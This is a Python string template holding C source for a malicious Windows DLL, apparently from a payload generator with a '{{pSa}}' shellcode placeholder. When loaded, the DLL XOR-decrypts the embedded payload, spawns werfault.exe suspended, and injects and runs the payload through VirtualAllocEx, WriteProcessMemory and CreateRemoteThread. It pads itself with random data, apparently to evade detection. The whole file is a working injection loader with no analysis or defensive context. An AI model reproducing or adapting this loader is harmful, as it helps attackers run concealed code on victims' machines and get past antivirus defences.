evildll = """
#include <windows.h>
#pragma comment(lib, "user32.lib")

// XOR key for decryption
#define XOR_KEY 0xFA

// Structure to hold the payload and its length
struct PayloadStruct {
    unsigned char *payload;
    unsigned int payload_len;
};

// Random data for obfuscation
unsigned char randomData1[256 * 1024];
unsigned char randomData2[256 * 1024];

// Initialize the random data with some values
void InitializeRandomData() {
    for (int i = 0; i < sizeof(randomData1); i++) {
        randomData1[i] = (unsigned char)(rand() % 256);
    }
    for (int i = 0; i < sizeof(randomData2); i++) {
        randomData2[i] = (unsigned char)(rand() % 256);
    }
}

// XOR decryption
void DecryptPayload(unsigned char* payload, unsigned int len) {
    for (unsigned int i = 0; i < len; i++) {
        payload[i] ^= XOR_KEY;
    }
}

// The actual payload and its length
unsigned char actualPayload[] = "{{pSa}}";
unsigned int actualPayload_len = sizeof(actualPayload);

// Function to spawn a werfault.exe process in suspended mode
HANDLE SpawnWerfaultSuspended(PROCESS_INFORMATION *pi) {
    STARTUPINFOW si = { sizeof(si) };
    BOOL success = CreateProcessW(L"C:\\\Windows\\\System32\\\werfault.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi);
    return success ? pi->hProcess : NULL;
}

// Function to inject and execute the payload in the target process
void InjectAndExecutePayload(HANDLE targetProcess, unsigned char* payload, unsigned int payload_len) {
    LPVOID execMemory = VirtualAllocEx(targetProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        TerminateProcess(targetProcess, 1);
        CloseHandle(targetProcess);
        return;
    }

    SIZE_T bytesWritten;
    BOOL writeResult = WriteProcessMemory(targetProcess, execMemory, (LPCVOID)payload, payload_len, &bytesWritten);
    if (!writeResult || bytesWritten != payload_len) {
        VirtualFreeEx(targetProcess, execMemory, 0, MEM_RELEASE);
        TerminateProcess(targetProcess, 1);
        CloseHandle(targetProcess);
        return;
    }

    HANDLE threadHandle = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
    if (threadHandle == NULL) {
        VirtualFreeEx(targetProcess, execMemory, 0, MEM_RELEASE);
        TerminateProcess(targetProcess, 1);
        CloseHandle(targetProcess);
        return;
    }

    ResumeThread(targetProcess);

    CloseHandle(threadHandle);
    CloseHandle(targetProcess);
}

DWORD WINAPI PayloadThread(LPVOID lpParameter) {
    PayloadStruct *payloadStruct = (PayloadStruct *)lpParameter;

    // Decrypt the payload
    DecryptPayload(payloadStruct->payload, payloadStruct->payload_len);

    // Spawn a suspended werfault.exe process
    PROCESS_INFORMATION pi;
    HANDLE targetProcess = SpawnWerfaultSuspended(&pi);
    if (targetProcess == NULL) {
        return -1;
    }

    // Inject and execute the payload in werfault.exe
    InjectAndExecutePayload(targetProcess, payloadStruct->payload, payloadStruct->payload_len);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    static PayloadStruct payloadStruct;
    HANDLE threadHandle = NULL;

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Initialize the payload structure
        payloadStruct.payload = actualPayload;
        payloadStruct.payload_len = actualPayload_len;

        // Initialize random data
        InitializeRandomData();

        // Create a thread to run the payload injection
        threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadThread, &payloadStruct, 0, NULL);
        if (threadHandle == NULL) {
            return FALSE;
        }
        CloseHandle(threadHandle);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

"""
